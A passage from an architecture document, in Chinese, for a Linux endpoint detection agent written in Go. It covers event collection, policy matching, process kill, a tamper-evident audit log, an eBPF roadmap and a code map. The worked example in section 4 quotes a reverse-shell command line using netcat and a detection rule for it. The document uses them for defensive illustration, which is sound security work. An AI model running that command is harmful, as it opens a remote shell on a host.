    "event_summary":   { count, total, limit, offset }
  }
  ─────────────────────────────────────────────────────────────
  限制: 路径必须在 artifact_dir 下（safePathUnder 校验）
  默认: event_limit=200
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/control/forensics.go` |
| **完成度** | ✅ v0.1 基础；v0.15 加了路径校验；v0.16 计划扩展（进程树/登录/cron） |
| **已知短板** | 当前是"轻量 bundle"；缺进程树/文件时间线/登录痕迹/cron/systemd 全采样 |

---

## 4. 关键链路：从"看到威胁"到"挡住威胁"

下面走一个具体例子——**"用户在 /tmp 跑了个反弹 shell，被黑名单命中"**：

```
 ① 启动期
    systemd 启 edr-agent → 加载 policy.json → 加载 log.key
    → emitStartupVerify() 写一条 log-verify-startup 审计事件
    → 监听 Unix Socket

 ② 采集期（每 5s）
    /proc/1234/comm = "nc"
    /proc/1234/exe  = "/usr/bin/nc.openbsd"
    /proc/1234/stat (第 22 字段) = 12345
    /proc/net/tcp   = 192.168.1.5:4444 ESTABLISHED
    → Snapshot{Processes:[{PID:1234, Name:"nc", Path:"/usr/bin/nc.openbsd",
                          Cmdline:"nc -e /bin/sh 1.2.3.4 4444",
                          StartTicks:"12345"}],
                Connections:[{Protocol:"tcp", LocalAddr:"192.168.1.5",
                              LocalPort:4444, RemoteAddr:"1.2.3.4"}]}

 ③ 策略匹配
    ProcessAccess.Mode = "enforce"
    Blacklist 有规则: { name="nc", cmdline_contains="-e" }
    → EvaluateProcessAccess 返回 (Rule, true)
    → Rule.Decision = "deny", Rule.Action = "kill"
    → dedup_key = "process:rule-bl-nc:1234:12345"
    → Suppressor.Allow()  → 放行 (首次)

 ④ 响应
    SoftResponder.Apply({Action:kill, PID:1234, ProcessPath:"/usr/bin/nc.openbsd",
                        StartTicks:"12345"})
    → sameProcess() 重读 /proc/1234/exe 和 stat
    → 一致 → PidfdKill(1234) [pidfd_open + pidfd_send_signal, TOCTOU-safe]
    → fallback: os.FindProcess(1234).Kill()
    → Result{Success:true, Detail:"killed pid 1234 via pidfd"}
    → 记录到 History + 异步 append responses.jsonl

 ⑤ 审计
    Logger.Write(Event{
      EventID:"process-rule-bl-nc-1717500000000",
      Category:"process", Severity:"high",
      Subject:{pid:1234, name:"nc", path:"/usr/bin/nc.openbsd", cmdline:"…"},
      Action:"kill", Decision:"deny", RuleID:"rule-bl-nc",
      Evidence:{response: Result{…}}
    })
    → 算 hash = SHA256(prev_hash || 序列化)
    → 算 HMAC = SHA256(key, hash)
    → 追加到 events.jsonl
    → 更新 events.jsonl.state{LastSeq, LastHash, …}

 ⑥ 取证（操作员手动）
    edrctl forensics export path=/home/cheater/edr-runtime/forensics/now.json
    → ForensicsBundle（含上面这条事件、当前策略、metrics）

 ⑦ 验证（任何时候）
    edrctl events verify
    → eventlog.Verify()
    → 逐行重算 hash+HMAC
    → {"ok":true, "last_seq":42, "chain_lines":42, "issues":[]}
```

**整条链路 1 个事件耗时**：单线程同步，约 < 5ms。ticker 是 5s，所以 agent 资源占用极低。

---

## 5. 完成度矩阵（v0.15 当前）

### 5.1 已实现模块

| # | 模块 | 涉及代码 | 能力 | 状态 | 关键证据 |
|---|---|---|---|---|---|
| 1 | 进程采集 | `internal/collector/collector.go` + `internal/procutil/` | 枚举 /proc、PID+start_ticks 防重用 | ✅ v0.1 | `readProcesses()` |
| 2 | 网络采集 | `internal/collector/collector.go` | 解析 /proc/net/tcp+udp | ✅ v0.1 | `readNet()` |
| 3 | 文件采集 | `internal/collector/collector.go` | inotify 优先 + poll 回退 | ✅ v0.1 | `scanFileChangesInotify()` |
| 4 | 基线检查 | `internal/baseline/` + `configs/baseline.json` | 文件存在+权限位检查 | ✅ v0.1 | `baseline.Run()` |
| 5 | 策略引擎 | `internal/policy/policy.go` | JSON + 白名单优先 + Priority + Effect | ✅ v0.15 | `EvaluateAll()` + `AggregatedDecision()` |
| 6 | 进程访问控制 | `internal/policy.process_access` + `response.kill` | monitor/enforce + kill 前 PID+ticks 校验 | ✅ v0.1 | `sameProcess()` |
| 7 | 文件控制 | `internal/response.fix_permissions` | path/prefix/file_op + Fchmod 防 TOCTOU | ✅ v0.1 | `chmodNoFollow()` |
| 8 | 网络控制 | `internal/response.nft.go` | nft provider 拼命令 + dry-run 默认 | ⚠️ v0.15 stub | `NFTProvider.ApplyBlock()` |
| 9 | 软响应 | `internal/response/` | kill / fix_permissions / nft / quarantine | ✅ v0.1+ | `SoftResponder.Apply()` |
| 10 | 事件审计 | `internal/eventlog/event.go` | JSONL + 轮转 + 保留数 | ✅ v0.1 | `Logger.Write()` |
| 11 | **日志完整性** | `internal/eventlog/integrity.go` + `internal/integrity/keystore.go` | hash chain + HMAC + 启动 verify + /v0/events/verify + legacy 识别 | ✅ v0.15 | `chainWriter.Seal()` + `Verify()` |
| 12 | **事件抑制** | `internal/control/suppress.go` | 3 类 cooldown + 每规则令牌桶 + 派生 dedup key | ✅ v0.15 | `Suppressor.Allow()` |
| 13 | **多命中策略** | `internal/policy/policy.go` | Priority 排序 + Effect 分离 + AggregatedDecision | ✅ v0.15 | `EvaluateAll()` + `AggregatedDecision()` |
| 14 | 控制面 | `internal/control/server.go` | HTTP over UDS + SO_PEERCRED + allowed_uids | ✅ v0.1 | `NewServerWithOptions()` |
| 15 | 路径安全 | `internal/control/security.go` | 策略/取证路径约束 + symlink 解析 | ✅ v0.1 | `safePathUnder()` |
| 16 | 响应安全 | `internal/response/response.go` | PID 身份校验 + fd 级 chmod | ✅ v0.1 | `sameProcess()` + `chmodNoFollow()` |
| 17 | 查询分页 | `internal/control/server.go` events | 流式分页 + limit 硬上限 1000 | ✅ v0.1 | `queryEvents()` |
| 18 | 本地取证 | `internal/control/forensics.go` | bundle JSON（policy/events/responses/metrics/snapshot） | ✅ v0.1 | `ExportForensics()` |
| 19 | **systemd 硬化** | `systemd/edr-agent.service` | 17 项 hardening 指令 | ✅ v0.15 | 单元全文 |
| 20 | **部署权限固化** | `scripts/install.sh` | 目录 0750 / 配置 0640 / key 0600 自动化 | ✅ v0.15 | `install.sh` |
| 21 | 测试套件 | `internal/.../*_test.go` | 策略/控制/采集/响应/integrity/suppression 单元测试 | ✅ v0.15 | 17+ 用例 |
| 22 | 门禁脚本 | `scripts/verify_m3.py` + `verify_v015.sh` | M3 9/9 + v0.15 篡改检测 | ✅ v0.15 | `verify-m3-report.json` |
| 23 | 手测脚本 | `scripts/test_*.sh` + `lib/*.sh` | 4 个手测脚本，25 断言全过 | ✅ v0.15 | `test_v015_scenarios.sh` |
| 24 | 流程文档 | `audit/test-flow-v015.md` | 13 场景 T1-T13 + 端到端命令串 | ✅ v0.15 | 全文 |

### 5.2 未实现 / 升级方向

| 方向 | 优先级 | 目标版本 | 原因 |
|---|---|---|---|
| eBPF telemetry | 🔴 P0 | v0.2 | procfs 轮询 5s 盲区，短命进程会漏 |
| fanotify 文件访问阻断 | 🔴 P0 | v0.3 | "写后检测"挡不住"打开前阻断" |
| 实时进程/网络强制 | 🟠 P1 | v0.4 | eBPF + fanotify 后的强制决策链 |
| agent 内核自保护 | 🟠 P1 | v0.5 | LSM 主路径诊断、配置/socket/log 防改、防删、防停 |
| 自保护健康态 | 🟠 P1 | v0.5 | 暴露 probe attach、agent_pid map、enforce mode、最近阻断事件 |
| 受控停机边界回归 | 🟠 P1 | v0.5 | 固化 sudo/loginuid 拒绝测试和 root/systemd 合法停机测试 |
| 远端 anchor | 🟡 P2 | v0.16 | 当前 chain 只能本地 detect |
| 抑制器状态持久化 | 🟡 P2 | v0.16 | 重启清零会有重复告警 |
| 策略签名+审批 | 🟡 P2 | v0.16 | 防止恶意 reload |
| `MemoryDenyWriteExecute=true` | 🟡 P2 | v0.16 | Go GC 兼容性需单独验证 |
| nft provider 完整实现 | 🟡 P2 | v0.2 | 当前 stub 缺完整回滚 |
| 进程树/登录/cron/systemd 枚举 | 🟡 P2 | v0.2 | 上下文关联缺失 |
| **BPF 真实内核加载回归** | 🟠 P1 | v0.2 (root VM) | CAP_BPF=0 本机只能验产物链;真实 `bpf_object__load` 需 root VM 端到端 |
| **BPF fork/exit tracepoint** | 🟡 P2 | v0.2 增量 | EventFork/EventExit 已定义,只需加挂载 + probes |
| **BPF kprobe/kretprobe** | 🟢 P3 | v0.4 | `tcp_connect` 等 tracepoint 拿不到的细粒度点 |
| 远程控制台/中心化 | 🟢 P3 | v0.5+ | 当前只有本地 socket |
| BPF-LSM 强制访问控制 | 🟢 P3 | v0.5 | 真内核态强制 |
| 完整 LKM 拦截器 | ⚫ 不建议 | — | 风险高、调试贵 |
| rootkit 式隐藏/钩子 | ⚫ 不建议 | — | 与可审计目标冲突 |

### 5.3 当前已知短板

| 短板 | 现状 | 影响 |
|---|---|---|
| `allowed_uids` 默认 `[0]` | 部署态只允许 root | 本地测试需改成 `[1000]`（cheater uid） |
| `integrity.key_path` 写死 `/var/lib/edr/log.key` | 部署态绝对路径 | 本地测试需改成 `/home/cheater/edr-runtime/log.key` |
| 抑制器状态不持久化 | 重启清零 | 跨重启会有重复告警（推到 v0.16） |
| PID namespace 未验证 | /proc 解析不验证 PID 属于当前 namespace | 容器环境可能误读宿主进程（S22，已知限制） |
| 测试脚本无法可靠 restart agent | harness 下 SIGHUP 链条不稳 | `test_chain_persistence.sh` 改为 in-place |

### 5.4 v0.2 新增已知短板

| 短板 | 现状 | 影响 |
|---|---|---|
| BPF 真实加载未回归 | 本机 CAP_BPF=0,`bpf_object__load` 一定失败 | gate 验的是"产物链 + 解析器 + 编译",不是"真实加载成功";R-C1 已写进 §9 反例,需 root VM 端到端 |
| `vmlinux.h` 是 host-kernel 绑定 | 跨主机不可复跑 | 不进 VCS + Makefile stamp 规则;部署脚本在装机时生成 |
| fork/exit tracepoint 未挂载 | EventFork/EventExit 类型已定义,loader 未挂这两个 tracepoint | 不影响 gate,只是 v0.2 的 exec/connect 只覆盖了部分场景 |
| kprobe 兜底未做 | tracepoint 拿不到的内核点(如进程级 connect 失败原因) | v0.2 先稳 tracepoint,kprobe 是 v0.4 增量 |

---

## 6. 当前正在做 / 即将做的开发点

### 6.1 上一轮刚收尾（v0.15）

| 改动 | 文件 | 说明 |
|---|---|---|
| 日志完整性链 | `internal/eventlog/integrity.go`、`internal/integrity/keystore.go` | hash chain + HMAC + 启动 verify + legacy 段 |
| 抑制器 | `internal/control/suppress.go` | 3 类 cooldown + 令牌桶 + 派生 dedup key |
| 策略多命中 | `internal/policy/policy.go` | Priority + Effect + EvaluateAll + AggregatedDecision |
| systemd 硬化 | `systemd/edr-agent.service` | 17 项 hardening |
| install 权限 | `scripts/install.sh` | 目录 0750 / 配置 0640 / key 0600 |

**门禁全绿**：`go test ./...` 通过 / `go build` 通过 / `make verify-m3` 9/9 / `make verify-v015` 篡改检测通过。

### 6.2 本轮刚收尾（v0.2 Step 4c）

| 改动 | 文件 | 说明 |
|---|---|---|
| BPF C 探针 | `internal/bpf/probes/{exec,connect}.bpf.c` + `common.bpf.h` | `handle_exec` 挂 `sched_process_exec`,`handle_connect` 挂 `inet_sock_set_state`,ring buffer 推 `edr_event`(330 bytes) |
| BPF 产物链 | `internal/bpf/probes/{exec,connect,all}.bpf.o` | `clang -target bpf` 编译 + `bpftool gen object` 合并(weak map 去重) |
| BPF 解析器 | `internal/bpf/event_parse.go` + 12 单测 | 纯 Go 二进制 layout 解析 v4/v6/unknown family/超长 buffer/NUL/UTC |
| BPF Loader 接口 | `internal/bpf/loader.go` + `fake.go` + `fake_test.go` | `Loader` interface + 测试用 `FakeLoader` 错误注入 + 满载 drop 契约 |
| libbpf Loader | `internal/bpf/loader_libbpf.go` (`//go:build bpf`) | cgo 桥 inline 在 preamble;`edr_open/poll/close/set_go_ctx/on_event` + Go `edr_deliver_event`(`//export`) + `pump()` goroutine 100ms poll |
| MergedCollector | `internal/collector/merge.go` | BPF channel 不持锁,counter 写时短锁,`BPFHealth` 值拷贝返回 |
| agent 入口切换 | `cmd/edr-agent/main.go` + `main_stub_bpf.go` + `main_libbpf.go` | build tag 切 stub / 真 loader;`enabled=false` 返 nil;`enabled=true` 任何 err 都 fatal |
| Makefile 构建链 | `Makefile` | 5 新 target:`bpf-vmlinux` / `bpf-build` / `bpf-link` / `bpf-verify` / `build-bpf`;`audit-ready` 同时验 `build`(默认 stub)和 `build-bpf`(cgo) |
| Iron Rules §9 反例 | `audit/DEV_IRON_RULES.md` | 9 条 v0.2 新反例:cgo 隐式声明 / C 文件双重 include / libbpf 1.0+ callback 签名 / cgo `unsigned int` / bpftool weak map / build tag 两条 path / CAP_BPF=0 gate 分层 / softirq drop / binary contract |

**门禁全绿**：`go test ./...` 通过 / `go build` + `go build -tags bpf` 通过 / `make bpf-link` + `make bpf-verify` + `make build-bpf` 通过 / `make audit-ready` **13/13 gates 全绿**。

### 6.3 当前环境约束（影响路线选择）

| 约束 | 现状 | 影响 |
|---|---|---|
| clang | ✅ 已装(v18.1.3) | eBPF `.bpf.c` 编译通过 |
| root / sudo | ❌ 无密码 sudo | `CAP_BPF` / `CAP_PERFMON` 拿不到,**无法** `bpf_object__load`;gate 验的是"产物链 + 解析器" |
| libbpf / bpftool | ✅ 已装(bpftool v7.7.0,libbpf v1.7) | 编译 + link + verify 正常 |
| 内核 BTF | ✅ 6.17 有 vmlinux BTF | `vmlinux.h` 可由 bpftool 导出 |
| `go.sum` / `vendor` | ❌ 无 | 暂未引入任何外部 Go 依赖 |

**结论**：v0.2 Step 4c 的"产物链 + 解析器 + 加载器接口"已**在本机全部跑通**(`make audit-ready` 13/13 绿),但**真实内核加载**(`bpf_object__load` + tracepoint attach) 需要 root VM 端到端回归。v0.16 收尾 4 项可以本机全跑通。

### 6.4 即将做的候选

| 候选 | 工作量 | 本机可验 | 价值 | 建议 |
|---|---|---|---|---|
| **v0.16 抑制器持久化** | 小 | ✅ | 中（解决重启重复告警） | ⭐ 优先做 |
| **v0.16 远端 anchor** | 中 | ✅ | 高（防 root 删日志） | ⭐ 优先做 |
| **v0.16 策略签名** | 中 | ✅ | 中（防恶意 reload） | 做（与 anchor 一起） |
| **v0.16 `MemoryDenyWriteExecute`** | 小但有风险 | ⚠️ 需 GC 兼容测试 | 中（提升 systemd 打分） | 单独 PR 评估 |
| **v0.2 eBPF 真实加载回归** | 中 | ❌ 需 root VM | 高（短命进程 / exec 实时） | root VM 端到端 |
| **v0.2 fork/exit tracepoint** | 小 | ❌ 需 root VM | 中（补全 fork/exit 场景） | 与真实加载一起 |
| **LSM 自保护升级** | 中 | ❌ 需 root VM | 高（可观测主阻断路径） | v0.5 目标 |
| **PID namespace 验证** | 中 | ⚠️ | 中（容器环境安全） | S22，v0.5 候选 |

---

## 7. 下阶段路线（ring0）

按 `PROJECT_STATUS.md` 第 9-11 节，下面是 ring0 的 5 个阶段：

```
  v0.15 (已交付)
     │
     ▼
  Phase A: v0.16 收尾
    ├─ 抑制器状态持久化       (推 cooldown/令牌桶到 .state 文件)
    ├─ 远端 anchor            (定期把 chain head 推 HTTP 或文件镜像)
    ├─ 策略签名 + 审批链      (Ed25519 签名 policy.json)
    └─ MemoryDenyWriteExecute  (单独评估 Go GC 兼容)
     │
     ▼
  Phase B: v0.2 kernel-assisted ← 关键拐点 (Step 4c 已收尾)
    ├─ internal/bpf/ 新包 (event.go / event_parse.go / loader.go / fake.go / loader_libbpf.go)
    ├─ probes/{exec,connect}.bpf.c + common.bpf.h + vmlinux.h
    ├─ clang -target bpf 编译 + bpftool gen object 合并(weak map 去重)
    ├─ tracepoint 覆盖: sched_process_exec (exec) + inet_sock_set_state (connect)
    ├─ libbpf cgo loader (inline C bridge + //export edr_deliver_event + pump goroutine)
    ├─ FakeLoader 测试注入 + 12 个 ParseEvent 单测
    ├─ MergedCollector 合并 BPF channel + procfs Snapshot
    ├─ build tag 切 stub / 真 loader (//go:build bpf / !bpf)
    ├─ Makefile 5 新 target: bpf-vmlinux / bpf-build / bpf-link / bpf-verify / build-bpf
    ├─ audit-ready 13/13 全绿(默认 + -tags bpf 两条 path)
    └─ 用户态 policy engine 不动
    └─ ⚠️ 真实内核加载需 root VM 端到端回归(CAP_BPF=0 本机做不到)
     │
     ▼
  Phase C: v0.3 fanotify 文件访问阻断
    ├─ internal/fanotify/ 新包
    ├─ 覆盖 /etc /usr/local/bin /tmp /var/spool/cron
    └─ 与现有 file rule 统一规则模型
     │
     ▼
  Phase D: v0.4 进程/网络强制
    ├─ 更实时的 exec/connect 决策链
    ├─ 稳定的 nft/iptables 联动
    └─ 更可靠的回滚 + kill switch
     │
     ▼
  Phase E: v0.5 自保护
    ├─ LSM selfprotect 升级为可观测主阻断路径
    ├─ eBPF/LSM 监控并限制对 agent/配置/socket/日志的修改
    ├─ 暴露自保护健康态和 fail-closed 告警
    └─ 固化“普通 sudo 不可停机”的安全边界
```

**v0.2 起步的工程要求**（在 `PROJECT_STATUS.md` 第 11 节）：

1. 所有 kernel-assisted 功能必须可配置关闭
2. 必须有 safe mode / fallback mode
3. 必须保留 `--once`、离线验证和回滚路径
4. 必须把 ring3 与 ring0 provider 解耦，不要重写策略层
5. 必须先增加性能/稳定性/误报基线测试
6. 必须有虚拟机回归环境，**不**在真实主机直接调试内核能力

---

## 8. 怎么读这份文档

| 你的角色 | 推荐阅读顺序 |
|---|---|
| **第一次接触项目** | §0 → §1 → §2 → §3.1-3.3 → §5.1 |
| **要改/扩 v0.15 代码** | §3.5 控制面 → §3.4 审计层 → §3.2 策略层 → §3.3 响应层 |
| **关心测试/门禁** | §3.9 → `audit/test-flow-v015.md` → `make verify-v015` |
| **要进 ring0 路线** | §6.2 现状约束 → §6.3 候选 → §7 路线图 → `PROJECT_STATUS.md` §9-11 |
| **要做运维/部署** | §3.7 入口 → §3.8 硬化 → `scripts/install.sh` → `systemd/edr-agent.service` |

---

## 附录 A：代码地图（按目录）

```
EDR/
├── README.md                           入门（已有）
├── PROJECT_STATUS.md                   当前 + ring0 路线（已有）
├── ARCHITECTURE.md                     ← 本文档
│
├── go.mod                              module edr; go 1.22
├── Makefile                            build / test / verify-m3 / verify-v015 / install
│
├── cmd/
│   ├── edr-agent/main.go               守护进程入口（拼装+启动）
│   └── edrctl/main.go                  本地 CLI（翻译成 HTTP over UDS）
│
├── internal/
│   ├── baseline/baseline.go            文件基线（存在+权限）
│   ├── collector/collector.go          /proc + /proc/net + inotify
│   ├── procutil/proc.go                start_ticks 解析工具
│   ├── policy/policy.go                JSON 策略 + 多命中 + 优先级 + 审计/响应分离
│   ├── response/response.go            SoftResponder: kill/chmod/quarantine
│   ├── response/nft.go                 NFTProvider: nft add/list/delete
│   ├── eventlog/event.go               Logger: JSONL 写 + 轮转
│   ├── eventlog/integrity.go           hash chain + HMAC + Verify
│   ├── integrity/keystore.go           log.key 加载/生成
│   ├── control/agent.go                Agent 状态机 + RunOnce 主循环
│   ├── control/server.go               HTTP over UDS, 14 个路由
│   ├── control/forensics.go            ForensicsBundle 打包
│   ├── control/security.go             SO_PEERCRED + safePathUnder
│   ├── control/suppress.go             Suppressor: cooldown + 令牌桶
│   ├── bpf/event.go                    EventType / Event struct(ring buffer payload Go 表达)
│   ├── bpf/event_parse.go              纯 Go 解析器(330 byte layout)
│   ├── bpf/event_parse_test.go         12 个单测(v4/v6/NUL/UTC/超长/短 buffer/未知 type)
│   ├── bpf/loader.go                   Loader interface(Load/Events/Errors/Close)
│   ├── bpf/fake.go                     FakeLoader(测试注入/错误注入)
│   ├── bpf/loader_libbpf.go            真 libbpf loader(cgo inline C bridge + pump goroutine)
│   ├── bpf/probes/common.bpf.h       C 端 edr_event struct + weak events ring buffer map
│   ├── bpf/probes/exec.bpf.c         handle_exec tracepoint(sched_process_exec) + blacklist_filename 双查
│   ├── bpf/probes/connect.bpf.c      handle_connect tracepoint(inet_sock_set_state)
│   ├── bpf/probes/exit.bpf.c         handle_exit tracepoint(sched_process_exit)
│   ├── bpf/probes/fork.bpf.c         handle_fork tracepoint(sched_process_fork)
│   ├── bpf/probes/selfprotect.bpf.c  handle_kill/tgkill/ptrace kprobe override
│   ├── bpf/probes/vmlinux.h          bpftool btf dump 生成(host-kernel 绑定,不进 VCS)
│   └── verify/                         (空目录，保留)
│
├── configs/
│   ├── agent.json                      agent 运行时配置
│   ├── baseline.json                   文件基线模板
│   └── policy.json                     策略规则
│
├── systemd/
│   └── edr-agent.service               17 项 hardening 单元
│
├── scripts/
│   ├── install.sh                      部署期权限固化
│   ├── verify_m3.py                    M3 门禁（detection/FP）
│   ├── verify_v015.sh                  v0.15 门禁（起链+verify+篡改）
│   ├── test_v015_scenarios.sh          8 场景手测
│   ├── test_suppression.sh             抑制器手测
│   ├── test_chain_persistence.sh       链跨重启手测
│   ├── test_reset.sh                   取证手测
│   └── lib/{agent,ui}.sh               手测公共库
│
├── audit/                              审计/文档
│   ├── milestone-m3.md                 M3 验收清单
│   ├── milestone-v015.md               v0.15 升级清单
│   ├── test-flow-v015.md               13 场景详解
│   ├── verify-m3-report.json           M3 报告（机器可读）
│   └── ARCHITECTURE.md                 ← 本文档
│
├── testdata/
│   ├── policies/                       测试用策略样本
│   └── samples/m3_samples.json         M3 8 恶意+8 良性样本
│
├── var/                                本地运行时（git ignore）
│   ├── run/edr-agent.sock              Unix Socket
│   ├── events.jsonl                    主审计日志
│   ├── events.jsonl.state              链头状态
│   ├── responses.jsonl                 响应流水
│   └── forensics/                      取证 bundle 输出
│
└── edr-agent / edrctl                  编译产物二进制
```

## 附录 B：术语表

| 术语 | 解释 |
|---|---|
| **ring3** | x86 权限环中的最低两级（用户态）。本项目 v0.15 全程在 ring3。 |
| **ring0** | x86 权限环中的最高级（内核态）。eBPF / fanotify / LSM / LKM 都在这层。 |
| **tracepoint** | 内核源码里预埋的静态 hook，`/sys/kernel/debug/tracing/` 可见。BPF 程序可挂载。 |
| **hash chain** | 每条记录的 hash 都包含前一条 hash 的链式结构，任一行被改都能验出。 |
| **HMAC** | 带密钥的 hash，能区分"合法修改"和"篡改"。 |
| **legacy 段** | v0.1 时代的事件不带 v0.15 字段，verify 识别为"老段"不报错也不参与链。 |
| **dedup key** | 抑制器派生：`category:rule_id:pid:start_ticks` 等，避免同一事件重复。 |
| **cooldown** | 同一 dedup key 在 N 秒内只允许一次 emit。 |
| **token bucket** | 令牌桶限流：每规则每秒 N 个，桶满 burst 个。 |
| **SafePath** | 路径白名单机制，必须在 base 目录下，解析 symlink 后仍不能逃逸。 |
| **SO_PEERCRED** | Linux UDS 选项，可取到对端进程的 uid/gid/pid。 |
| **dry-run** | 仅记录动作，不真执行。nft_block 默认 dry-run。 |
